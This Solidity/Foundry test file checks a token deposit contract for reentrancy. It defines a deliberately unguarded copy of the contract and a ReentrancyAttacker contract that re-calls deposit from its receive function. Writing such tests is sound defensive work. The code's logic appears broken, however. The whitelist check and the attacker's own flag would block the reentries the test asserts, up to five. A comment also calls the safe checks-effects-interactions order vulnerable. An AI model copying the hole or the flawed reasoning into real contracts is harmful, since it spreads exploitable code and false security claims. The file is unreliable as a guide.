// SPDX-License-Identifier: Apache 2.0
pragma solidity ^0.8.26;

import {BaseTest} from "./utils/BaseTest.t.sol";
import {Deposit} from "../src/Deposit.sol";
import {Ownable} from "solady/src/auth/Ownable.sol";
import {SignatureCheckerLib} from "solady/src/utils/SignatureCheckerLib.sol";
import {IEthStrategy} from "../src/EthStrategy.sol";
import {console} from "forge-std/console.sol";

/**
 * @title DepositReentrancyFuzzTest
 * @notice Fuzzing test for reentrancy vulnerabilities in the Deposit contract
 */
contract DepositReentrancyFuzzTest is BaseTest {
    // Test parameters
    uint256 defaultConversionPremium = 0;
    uint256 defaultConversionRate = 30_000;
    uint256 defaultDepositCap = 10_000e18;
    
    // Contract instances
    Deposit deposit;
    ExploitableDeposit exploitableDeposit;
    Account signer;

    function setUp() public virtual override {
        super.setUp();
        
        // Create a signer account for whitelist signatures
        signer = makeAccount("signer");
        vm.label(signer.addr, "signer");
        
        // Deploy the original Deposit contract (with reentrancy protection)
        deposit = new Deposit(
            address(ethStrategy),
            signer.addr,
            defaultConversionRate,
            defaultConversionPremium,
            defaultDepositCap,
            uint64(block.timestamp)
        );
        
        // Deploy an exploitable version of the Deposit contract (without reentrancy protection)
        exploitableDeposit = new ExploitableDeposit(
            address(ethStrategy),
            signer.addr,
            defaultConversionRate,
            defaultConversionPremium,
            defaultDepositCap,
            uint64(block.timestamp)
        );
        
        // Grant minting roles to both contracts
        vm.startPrank(address(initialOwner.addr));
        ethStrategy.grantRole(ethStrategy.MINTER_ROLE(), address(deposit));
        ethStrategy.grantRole(ethStrategy.MINTER_ROLE(), address(exploitableDeposit));
        vm.stopPrank();
    }

    /**
     * @notice Helper function to generate a valid signature for a given address
     * @param _to The address to generate a signature for
     * @return The signature bytes
     */
    function getSignature(address _to) public view returns (bytes memory) {
        bytes32 hash = SignatureCheckerLib.toEthSignedMessageHash(abi.encodePacked(_to));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signer.key, hash);
        return abi.encodePacked(r, s, v);
    }

    /**
     * @notice Fuzz test that demonstrates how a malicious contract can exploit reentrancy
     * @param depositAmount The amount to deposit (bounded between MIN_DEPOSIT and MAX_DEPOSIT)
     * @param attackCount The number of reentrant calls to attempt (bounded between 1 and 5)
     */
    function testFuzz_ReentrancyExploit(uint256 depositAmount, uint8 attackCount) public {
        // Bound inputs to reasonable ranges
        depositAmount = bound(depositAmount, 1e18, 100e18);
        attackCount = uint8(bound(attackCount, 1, 5));
        
        // Create a malicious contract that will attempt to reenter during the ETH transfer
        ReentrancyAttacker attacker = new ReentrancyAttacker(
            address(exploitableDeposit),
            attackCount
        );
        
        // Set the attacker as the owner to receive ETH
        vm.prank(address(ethStrategy));
        exploitableDeposit.transferOwnership(address(attacker));
        
        // Fund the attacker with enough ETH for the initial deposit and potential reentrant calls
        vm.deal(address(attacker), depositAmount * (attackCount + 1));
        
        // Set up the signature for the attacker
        bytes memory signature = getSignature(address(attacker));
        attacker.setSignature(signature);
        
        // Record initial state
        uint256 initialDepositCap = exploitableDeposit.depositCap();
        uint256 initialBalance = ethStrategy.balanceOf(address(attacker));
        
        // Execute the attack
        attacker.attack(depositAmount);
        
        // Verify the attack succeeded
        uint256 finalBalance = ethStrategy.balanceOf(address(attacker));
        uint256 finalDepositCap = exploitableDeposit.depositCap();
        
        // The attacker should have received more tokens than expected from a single deposit
        assertGt(finalBalance, initialBalance + depositAmount * defaultConversionRate, 
            "Reentrancy attack should have minted extra tokens");
        
        // The deposit cap should have been reduced more than expected from a single deposit
        assertLt(finalDepositCap, initialDepositCap - depositAmount, 
            "Deposit cap should have been reduced multiple times");
        
        // Verify the attacker was able to reenter the expected number of times
        assertEq(attacker.successfulReentrancyCount(), attackCount, 
            "Attacker should have successfully reentered the expected number of times");
        
        // Log the results
        console.log("Initial deposit cap:", initialDepositCap);
        console.log("Final deposit cap:", finalDepositCap);
        console.log("Initial balance:", initialBalance);
        console.log("Final balance:", finalBalance);
        console.log("Successful reentrant calls:", attacker.successfulReentrancyCount());
    }

    /**
     * @notice Test that verifies the original Deposit contract is protected against reentrancy
     * @param depositAmount The amount to deposit (bounded between MIN_DEPOSIT and MAX_DEPOSIT)
     */
    function testFuzz_ReentrancyProtection(uint256 depositAmount) public {
        // Bound inputs to reasonable ranges
        depositAmount = bound(depositAmount, 1e18, 100e18);
        
        // Create a malicious contract that will attempt to reenter during the ETH transfer
        ReentrancyAttacker attacker = new ReentrancyAttacker(
            address(deposit),
            1 // Just try one reentrant call
        );
        
        // Set the attacker as the owner to receive ETH
        vm.prank(address(ethStrategy));
        deposit.transferOwnership(address(attacker));
        
        // Fund the attacker
        vm.deal(address(attacker), depositAmount * 2);
        
        // Set up the signature for the attacker
        bytes memory signature = getSignature(address(attacker));
        attacker.setSignature(signature);
        
        // Record initial state
        uint256 initialDepositCap = deposit.depositCap();
        uint256 initialBalance = ethStrategy.balanceOf(address(attacker));
        
        // Execute the attack - should fail due to reentrancy protection
        vm.expectRevert(Deposit.DepositFailed.selector);
        attacker.attack(depositAmount);
        
        // Verify state remains unchanged
        assertEq(deposit.depositCap(), initialDepositCap, "Deposit cap should be unchanged");
        assertEq(ethStrategy.balanceOf(address(attacker)), initialBalance, "Balance should be unchanged");
        assertEq(attacker.successfulReentrancyCount(), 0, "No reentrant calls should have succeeded");
    }
}

/**
 * @title ExploitableDeposit
 * @notice A version of the Deposit contract without reentrancy protection
 * @dev This contract is identical to the Deposit contract but without the nonreentrant modifier
 */
contract ExploitableDeposit is Ownable {
    /// @dev The conversion rate from ETH to EthStrategy (unit accounts)
    uint256 public immutable CONVERSION_RATE;
    /// @dev The minimum amount of ETH that can be deposited
    uint256 constant MIN_DEPOSIT = 1e18;
    /// @dev The maximum amount of ETH that can be deposited
    uint256 constant MAX_DEPOSIT = 100e18;

    error DepositAmountTooLow();
    error DepositAmountTooHigh();
    error DepositFailed();
    error AlreadyRedeemed();
    error DepositCapExceeded();
    error InvalidConversionPremium();
    error InvalidSignature();
    error InvalidCall();
    error DepositNotStarted();

    /// @dev The address of the Ethstrategy token
    address public immutable ethStrategy;
    /// @dev The address of the signer (if signer is set, whitelist is enabled)
    address public signer;
    /// @dev A mapping to track if a user has redeemed whitelist spot
    mapping(address => bool) public hasRedeemed;

    uint256 public immutable conversionPremium;
    uint64 public immutable startTime;
    uint256 public constant DENOMINATOR_BP = 100_00;
    /// @dev The maximum amount of ETH that can be deposited
    uint256 private depositCap_;

    constructor(
        address _ethStrategy,
        address _signer,
        uint256 _conversionRate,
        uint256 _conversionPremium,
        uint256 _depositCap,
        uint64 _startTime
    ) {
        if (_conversionPremium > DENOMINATOR_BP) revert InvalidConversionPremium();
        CONVERSION_RATE = _conversionRate;
        _initializeOwner(_ethStrategy);
        ethStrategy = _ethStrategy;
        signer = _signer;
        conversionPremium = _conversionPremium;
        depositCap_ = _depositCap;
        startTime = _startTime;
    }

    /**
     * @notice Deposit ETH and mint EthStrategy tokens
     * @dev This function is vulnerable to reentrancy because it updates state before making external calls
     * @param signature The signature of the signer for the depositor
     */
    function deposit(bytes calldata signature) external payable {
        if (block.timestamp < startTime) revert DepositNotStarted();
        uint256 value = msg.value;
        uint256 _depositCap = depositCap_;
        if (value > _depositCap) revert DepositCapExceeded();
        
        // Update state BEFORE external calls - vulnerable to reentrancy
        depositCap_ = _depositCap - value;

        if (signer != address(0)) {
            if (hasRedeemed[msg.sender]) revert AlreadyRedeemed();
            hasRedeemed[msg.sender] = true;
            bytes32 hash = SignatureCheckerLib.toEthSignedMessageHash(abi.encodePacked(msg.sender));
            if (!SignatureCheckerLib.isValidSignatureNow(signer, hash, signature)) revert InvalidSignature();
        }

        if (value < MIN_DEPOSIT) revert DepositAmountTooLow();
        if (value > MAX_DEPOSIT) revert DepositAmountTooHigh();

        uint256 amount = msg.value * CONVERSION_RATE;
        amount = amount * (DENOMINATOR_BP - conversionPremium) / DENOMINATOR_BP;

        // External call that can be exploited for reentrancy
        address payable recipient = payable(owner());
        (bool success,) = recipient.call{value: msg.value}("");
        if (!success) revert DepositFailed();

        // External call to mint tokens
        IEthStrategy(ethStrategy).mint(msg.sender, amount);
    }

    /**
     * @notice Get the current deposit cap
     * @return The current deposit cap
     */
    function depositCap() external view returns (uint256) {
        return depositCap_;
    }

    /**
     * @notice Set the signer
     * @param _signer The new signer
     */
    function setSigner(address _signer) external onlyOwner {
        signer = _signer;
    }

    /**
     * @dev A fallback function to reject any ETH sent to the contract that is not using a payable method
     */
    receive() external payable {
        revert InvalidCall();
    }
}

/**
 * @title ReentrancyAttacker
 * @notice A malicious contract that attempts to exploit reentrancy in the Deposit contract
 */
contract ReentrancyAttacker {
    // The target contract to attack
    address public immutable target;
    
    // The signature to use for deposits
    bytes public signature;
    
    // The maximum number of reentrant calls to attempt
    uint8 public immutable maxReentrancyCount;
    
    // The number of successful reentrant calls
    uint8 public successfulReentrancyCount;
    
    // Flag to track if we're currently in a reentrant call
    bool private inReentrancy;

    constructor(address _target, uint8 _maxReentrancyCount) {
        target = _target;
        maxReentrancyCount = _maxReentrancyCount;
    }

    /**
     * @notice Set the signature to use for deposits
     * @param _signature The signature bytes
     */
    function setSignature(bytes memory _signature) external {
        signature = _signature;
    }

    /**
     * @notice Initiate the attack by making an initial deposit
     * @param amount The amount to deposit
     */
    function attack(uint256 amount) external {
        // Make the initial deposit
        (bool success, ) = target.call{value: amount}(
            abi.encodeWithSignature("deposit(bytes)", signature)
        );
        require(success, "Initial deposit failed");
    }

    /**
     * @notice Receive function that attempts to reenter the deposit function
     * @dev This is called when the contract receives ETH during the external call in the deposit function
     */
    receive() external payable {
        // Only attempt reentrant calls if we haven't reached the maximum
        if (successfulReentrancyCount < maxReentrancyCount && !inReentrancy) {
            inReentrancy = true;
            
            // Attempt to reenter the deposit function
            (bool success, ) = target.call{value: msg.value}(
                abi.encodeWithSignature("deposit(bytes)", signature)
            );
            
            // If the reentrant call succeeded, increment the counter
            if (success) {
                successfulReentrancyCount++;
            }
            
            inReentrancy = false;
        }
    }
}
